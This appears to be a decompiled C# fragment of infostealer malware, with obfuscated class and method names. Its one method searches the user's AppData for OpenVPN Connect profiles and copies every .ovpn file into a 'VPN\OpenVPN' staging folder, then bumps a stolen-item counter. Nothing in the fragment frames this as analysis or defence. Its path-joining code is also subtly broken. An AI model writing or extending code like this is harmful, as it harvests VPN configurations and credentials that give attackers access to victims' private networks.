using System;
using System.IO;

internal class Class46
{
	public static void smethod_0()
	{
		string string_ = Class38.string_11;
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(string_ + "\\VPN\\OpenVPN");
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (Path.GetExtension(text)!.Contains("ovpn"))
				{
					File.Copy(text, Path.Combine(string_, "\\VPN\\OpenVPN" + Path.GetFileName(text)));
				}
			}
			Class36.int_14++;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
